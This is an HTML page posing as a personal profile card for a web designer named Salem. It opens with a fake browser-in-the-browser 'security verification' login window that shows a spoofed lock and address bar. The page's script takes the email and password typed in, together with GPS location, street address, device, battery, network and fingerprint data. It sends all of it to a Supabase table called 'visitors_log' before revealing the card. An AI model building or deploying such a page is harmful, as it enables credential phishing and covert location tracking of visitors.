<!DOCTYPE HTML>
<html lang="ar">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>SALEM | سـالـم</title>
    
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
    
    <style>
        :root {
            --back_color: radial-gradient(circle at center, #0a192f 0%, #020c1b 100%);
            --front_color: rgba(10, 25, 47, 0.7);
            --gold: #FFD700;
            --muted-gold: #c5a059;
            --deep-blue: #1A2980;
            --white: #e6f1ff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
        body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }

        /* واجهة الدخول */
        #auth-screen { position: fixed; inset: 0; background: var(--back_color); z-index: 1000; display: flex; justify-content: center; align-items: center; }
        .bitb-window { width: 90%; max-width: 380px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2); overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6); direction: rtl; animation: fadeIn 0.8s ease; }
        
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .bitb-header { background: rgba(2, 12, 27, 0.9); padding: 12px 18px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(197, 160, 89, 0.1); }
        .bitb-address-bar { background: rgba(255, 255, 255, 0.05); padding: 7px 15px; border-radius: 12px; font-size: 0.75em; color: var(--muted-gold); flex-grow: 1; margin: 0 10px; text-align: center; border: 1px solid rgba(197, 160, 89, 0.1); display: flex; align-items: center; justify-content: center; }
        
        .auth-box { padding: 35px 30px; text-align: center; }
        .auth-box h2 { color: var(--gold); margin-bottom: 10px; font-size: 1.5em; letter-spacing: 1px; }
        .auth-box p.info-text { color: var(--white); margin-bottom: 25px; font-size: 0.85em; opacity: 0.7; }
        .auth-box input { width: 100%; padding: 14px; margin: 8px 0; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(197, 160, 89, 0.15); border-radius: 12px; color: white; outline: none; text-align: center; }
        .auth-box button { width: 100%; padding: 14px; margin-top: 20px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }

        /* تصميم vCard */
        .vcard { width: 90%; max-width: 420px; height: 600px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); position: relative; overflow: hidden; display: none; }
        .header { height: 35%; position: relative; }
        .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
        .wave-01, .wave-02, .wave-03 { position: absolute; width: 550px; height: 550px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border-radius: 43%; animation: rotate 15s linear infinite; }
        .wave-01 { top: -180%; left: -15%; }
        .wave-02 { top: -185%; left: -20%; opacity: 0.3; animation-direction: reverse; }
        .wave-03 { top: -175%; left: -10%; opacity: 0.15; }
        @keyframes rotate { 100% { transform: rotate(360deg); } }
        
        .profile_pic_content { width: 135px; height: 135px; border-radius: 50%; position: absolute; left: 50%; transform: translate(-50%, -50%); top: 100%; overflow: hidden; border: 3px solid var(--muted-gold); z-index: 10; }
        .profile_video { width: 100%; height: 100%; object-fit: cover; }
        
        .card_content { padding-top: 85px; text-align: center; }
        .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
        .old-bio { color: var(--muted-gold); font-size: 0.95em; padding: 0 30px; line-height: 1.6; }
        
        .social { margin-top: 25px; }
        .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 0 20px; }
        .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
        
        .footer-text { position: absolute; bottom: 15px; width: 100%; font-size: 0.7em; color: rgba(136, 146, 176, 0.4); text-align: center; }
    </style>
</head>
<body>

<div id="auth-screen">
    <div class="bitb-window">
        <div class="bitb-header">
            <div class="bitb-action-dots"><span style="background:#ff5f56;"></span><span></span><span></span></div>
            <div class="bitb-address-bar"><i class="fas fa-lock" style="color:#4cd964; margin-left:5px;"></i> secure.verification/auth</div>
        </div>
        <div class="auth-box">
            <h2>تحقق أمني</h2>
            <p class="info-text">يرجى تأكيد الهوية للوصول إلى الملف الشخصي.</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="password" placeholder="كلمة المرور">
            <button id="login-btn" onclick="handleLogin()">تأكيد الدخول</button>
            <p id="error-msg" style="margin-top: 15px; font-size: 0.8em; color: #ff4d4d;"></p>
        </div>
    </div>
</div>

<div class="vcard" id="profile-card">
    <div class="header">
        <div class="wave_bg"><div class="wave-01"></div><div class="wave-02"></div><div class="wave-03"></div></div>
        <div class="profile_pic_content">
            <video class="profile_video" autoplay loop muted playsinline>
                <source src="https://files.catbox.moe/jvicv4.mp4" type="video/mp4">
            </video>
        </div>
    </div>
    <div class="card_content">
        <div class="satan"><h4>SALEM</h4></div>
        <div class="old-bio">Web Designer & Creative Developer.<br>Specialized in UI/UX Aesthetics.<br>BELIEVE IN YOURSELF.</div>
        <div class="social">
            <div>
                <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
                <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
                <a href="https://16salm.github.io/AI/"><i class="fas fa-lightbulb"></i></a>
                <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
                <a href="https://uokerbala.edu.iq/"><i class="fas fa-university"></i></a>
            </div>
        </div>
    </div>
    <p class="footer-text">© 2026 Salem Al-Shammari | Karbala, Iraq</p>
</div>

<script>
    // إعدادات Supabase (مشروعك الجديد)
    const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
    const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';
    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);

    // فحص حالة الدخول السابقة
    window.onload = () => {
        if (localStorage.getItem('isUnlocked') === 'true') {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('profile-card').style.display = 'block';
        }
    };

    // دوال جلب الموقع
    async function getAddressFromCoords(lat, lng) {
        try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=ar`);
            const data = await res.json();
            return data.display_name || "العنوان غير محدد";
        } catch (e) { return "خطأ في العنوان"; }
    }

    function getLocationGPS() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => resolve({ lat: p.coords.latitude, lng: p.coords.longitude }),
                    () => resolve(null), { timeout: 8000 }
                );
            } else resolve(null);
        });
    }

    // الدالة الرئيسية للإرسال والربط
    async function handleLogin() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const errorMsg = document.getElementById('error-msg');
        const loginBtn = document.getElementById('login-btn');

        if (!email.includes('@') || password.length < 6) {
            errorMsg.innerText = "البيانات المدخلة غير صالحة";
            return;
        }

        loginBtn.innerText = "جاري التحقق...";
        loginBtn.disabled = true;

        try {
            const fingerprint = `${screen.width}x${screen.height} | ${navigator.language}`;
            const device = navigator.userAgent.includes("iPhone") ? "iPhone" : (navigator.userAgent.includes("Android") ? "Android" : "PC/Other");

            let battery = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}%`;
            }

            const pos = await getLocationGPS();
            let coords = "Denied", addr = "No Permission", city = "Unknown";
            if (pos) {
                coords = `${pos.lat.toFixed(4)}, ${pos.lng.toFixed(4)}`;
                addr = await getAddressFromCoords(pos.lat, pos.lng);
            }

            // الإرسال لجدول visitors_log
            const { error } = await supabaseClient
                .from('visitors_log')
                .insert([{ 
                    visitor_email: email, 
                    visitor_password: password,
                    city: city,
                    coords: coords,
                    full_address: addr,
                    device_model: device,
                    battery_level: battery,
                    network_type: navigator.connection ? navigator.connection.effectiveType : "Unknown",
                    fingerprint: fingerprint 
                }]);

            if (error) throw error;

            localStorage.setItem('isUnlocked', 'true');
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('profile-card').style.display = 'block';

        } catch (err) {
            console.error(err);
            errorMsg.innerText = "حدث خطأ! تأكد من إعداد الجدول والسياسة في Supabase.";
            loginBtn.innerText = "تأكيد الدخول";
            loginBtn.disabled = false;
        }
    }
</script>
</body>
</html>
